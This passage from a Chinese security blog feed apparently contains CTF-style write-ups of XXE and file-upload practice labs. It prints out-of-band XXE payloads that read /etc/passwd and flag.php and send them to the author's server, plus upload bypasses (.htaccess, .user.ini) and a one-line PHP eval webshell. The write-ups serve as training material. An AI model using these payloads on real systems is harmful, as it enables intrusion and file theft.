&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://本人vps的ip:7890&amp;quot;/xxe.dtd&amp;quot;&amp;gt;%remote;]&amp;gt;
&amp;lt;comment&amp;gt;
&amp;lt;text&amp;gt;test&amp;amp;send;&amp;lt;/text&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015330.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后发现服务器端的监听有了反应，出来了&lt;code&gt;/etc/passwd&lt;/code&gt;经过&lt;code&gt;base64&lt;/code&gt;加密后字符&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015433.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们换成查询&lt;code&gt;flag&lt;/code&gt;的&lt;code&gt;.dtd&lt;/code&gt;文件，但是我们并不知道&lt;code&gt;flag&lt;/code&gt;在哪里，就尝试比较常见的几个&lt;code&gt;flag&lt;/code&gt;位置&lt;code&gt;flag.php&lt;/code&gt;、&lt;code&gt;/var/www/html/flag.php&lt;/code&gt;、&lt;code&gt;/flag&lt;/code&gt;等等&lt;/li&gt;
&lt;li&gt;最后我们发现正确的&lt;code&gt;flag&lt;/code&gt;位置在&lt;code&gt;/flag&lt;/code&gt;，发送请求，并获取加密后的字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015655.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015759.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用工具进行&lt;code&gt;base64&lt;/code&gt;解密（https://tool.leavesongs.com/），得到flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015917.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{simple_phpxxe}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;3-web-xxe1&#34;&gt;3. web-xxe1&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先登入靶场首页，发现调皮的Hello DaLao：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020552.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现没有什么东西，御剑跑起来看看，发现好像只有首页和&lt;code&gt;flag.php&lt;/code&gt;，而&lt;code&gt;flag.php&lt;/code&gt;并不能直接查看&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020907.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们之前扫描到了一个&lt;code&gt;flag.php&lt;/code&gt;文件，可以考虑通过&lt;code&gt;XXE&lt;/code&gt;漏洞直接读取这个文件，看看有没有效果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707021455.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们使用使用&lt;code&gt;burp&lt;/code&gt;抓包，并发送&lt;code&gt;xml&lt;/code&gt;类型的&lt;code&gt;post&lt;/code&gt;请求看看&lt;/li&gt;
&lt;li&gt;在服务器端构造&lt;code&gt;.dtd&lt;/code&gt;文件&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php://filter/read=convert.base64-encode/resource=flag.php&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;!ENTITY % mmm &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;!ENTITY xxe SYSTEM &amp;#39;http://本人vps的ip:7890/%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&amp;gt;
%mmm;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022114.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后使用&lt;code&gt;python3&lt;/code&gt;快速地构造一个&lt;code&gt;http&lt;/code&gt;服务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015008.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://本人vps的ip:7890/mmm.dtd&amp;quot;&amp;gt;
&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022028.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们发现服务器监听端口有了反应，返回了一串&lt;code&gt;base64&lt;/code&gt;加密后字符串，解密后是&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022204.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用工具进行&lt;code&gt;base64解密&lt;/code&gt;（https://tool.leavesongs.com/），得到flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022310.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{xxeisnotsafe}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;4-web-xxe2&#34;&gt;4. web-xxe2&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先登入靶场首页，发现Apache2 Ubuntu默认页面，猜测可能存在隐藏目录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004220.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先上扫描器扫一下&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004151.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现了登录页面，我们访问一下看看&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004606.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由于是&lt;code&gt;XXE&lt;/code&gt;的考题，我们直接登录抓包看看，发现是&lt;code&gt;xml&lt;/code&gt;类型，看来是&lt;code&gt;XXE&lt;/code&gt;没跑了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004800.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反复构造几个不同的请求包过去，看看&lt;code&gt;response&lt;/code&gt;有什么变化没有，发现没有返回其他东西，需要带外方式将数据传出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004920.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们之前扫描到了一个&lt;code&gt;flag.php&lt;/code&gt;文件，可以考虑通过&lt;code&gt;XXE&lt;/code&gt;漏洞直接读取这个文件，看看有没有效果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707002319.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先在服务器上构造&lt;code&gt;.dtd&lt;/code&gt;文件&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php://filter/read=convert.base64-encode/resource=flag.php&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;!ENTITY % mmm &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;!ENTITY xxe SYSTEM &amp;#39;http://本人vps的ip:7890/%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&amp;gt;
%mmm;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707002418.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后使用&lt;code&gt;python3&lt;/code&gt;快速地构造一个&lt;code&gt;http&lt;/code&gt;服务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707003518.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://本人vps的ip:7890/mmm.dtd&amp;quot;&amp;gt;
&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005212.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们发现服务器监听端口有了反应，返回了一串&lt;code&gt;base64&lt;/code&gt;加密数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707003047.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用工具对其进行解密，解密后得到&lt;code&gt;flag&lt;/code&gt;（https://tool.leavesongs.com/）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707003441.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{Hje60Ui1Na4LdxA8}&lt;/p&gt;
&lt;/blockquote&gt;
- https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>Writeup 之 Upload-Labs 魔改flag版</title>
        <link>https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/</link>
        <pubDate>Sat, 04 Jul 2020 23:22:33 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/ -&lt;h1 id=&#34;今日总结&#34;&gt;今日总结：&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;这次靶场主要是做这个有源码的靶场，所以理解源码的含义非常重要&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;上传实验室-p1&#34;&gt;上传实验室-p1&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;第一关很简单，直接上传&lt;code&gt;1.php&lt;/code&gt;，发现前端&lt;code&gt;js&lt;/code&gt;报错&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190945.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;推测是前端&lt;code&gt;js&lt;/code&gt;检查文件后缀类型，查看&lt;code&gt;js&lt;/code&gt;代码，发现&lt;code&gt;js&lt;/code&gt;对文件后缀进行了判断&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190823.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;个人习惯直接在控制台重写这个函数而不是用插件，直接在控制台增加&lt;code&gt;.php&lt;/code&gt;类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190857.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上传完成后，复制上传文件的地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190922.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用菜刀进行连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191033.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{a6487868}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p2&#34;&gt;上传实验室-p2&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;由于可以查看源码，直接看源码
&lt;ul&gt;
&lt;li&gt;发现后端在判断文件类型&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191740.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们尝试发一个1.php文件，但是改了centent-type类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191843.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现成功上传，复制上传文件的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191924.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用菜刀连接，发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192029.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705200725.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{5b323cff}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p3&#34;&gt;上传实验室-p3&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先我们看源码，发现很多办法都失效了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192130.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们尝试用&lt;code&gt;php3&lt;/code&gt;试试，发现成功上传，然后复制上传文件路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192247.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;连接菜刀，发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192425.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192625.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{22e47e94}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p4&#34;&gt;上传实验室-p4&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先我们看源码，发现很多办法都失效了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192657.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;但是&lt;code&gt;.htaccess&lt;/code&gt;没有被过滤，那么我们先传个&lt;code&gt;.htaccess&lt;/code&gt;文件上去，然后再让它自动修改我的图片文件为&lt;code&gt;php&lt;/code&gt;文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;构造&lt;code&gt;.htaccess&lt;/code&gt;如下：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;FilesMatch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.jpg&amp;#34;&lt;/span&gt;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;然后我们上传该文件后，继续上传&lt;code&gt;1.php&lt;/code&gt;更改后缀后的&lt;code&gt;1.jpg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1.jpg&lt;/code&gt;上传成功后，复制上传文件后的链接，链接菜刀，发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705200618.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192901.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{acc5bcdd}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p5&#34;&gt;上传实验室-p5&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;直接看源码，一开始感觉到这个源码几乎是无懈可击&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192942.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;经过很多很多很多很多很多很多很多次实验以及反复观察源码&lt;/strong&gt;，发现&lt;code&gt;php7&lt;/code&gt;没有被判断，同时查找资料发现配置文件&lt;code&gt;ini&lt;/code&gt;可以使用&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;关于&lt;code&gt;.user.ini&lt;/code&gt;文件的解释，我们可以好好地看p师傅之前写的文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html&#34;&gt;https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;总体来说，就是我们可以通过&lt;code&gt;.usr.ini&lt;/code&gt;轻松地让所有&lt;code&gt;php&lt;/code&gt;文件都自动包含某个文件，而这个文件可以是一个正常的&lt;code&gt;php&lt;/code&gt;文件，也可以是一个包含一句话木马的&lt;code&gt;webshell&lt;/code&gt;。也就是我们接下来要上传进去的&lt;code&gt;.gif&lt;/code&gt;文件一句话木马&lt;/li&gt;
&lt;li&gt;我们首先新建一个&lt;code&gt;.usr.ini&lt;/code&gt;文件，内容如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;auto_prepend_file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;five.gif
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;再新建一个&lt;code&gt;five.gif&lt;/code&gt;文件，内容如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;?php @eval&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$_POST&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mao&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;然后将这两个文件都上传至靶场中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193048.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后静静等待一下，尝试连接菜刀，连接成功&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193138.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现&lt;code&gt;flag&lt;/code&gt;，并查看&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193231.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193312.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{1407893c}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p6&#34;&gt;上传实验室-p6&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;直接查看源码，发现一堆过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193336.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现没有对大小写进行判断，那么我们直接切换大小写上传文件，并使用burp抓包改包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193431.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上传成功，并右键复制上传文件路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193456.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;连接菜刀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193550.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查到flag，并查看flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193635.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{73ff7959}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p11&#34;&gt;上传实验室-p11&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;直接查看源码，发现变量&lt;code&gt;$deny_ext&lt;/code&gt;只替换一次&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193654.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们可以考虑双写后缀看看行不行，构造一句话木马文件，名为&lt;code&gt;2.pphphp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;然后上传文件，上传成功，右键复制文件路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193727.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;连接菜刀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193824.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到flag文件，并发现flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193909.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{0bdd5600}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p12&#34;&gt;上传实验室-p12&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;直接源码审计，发现是白名单过滤，并且直接拼接本地图片路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193927.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上传改成如上图所示三个图片后缀的木马文件，然后使用burp抓包操作，发现两个路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194206.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
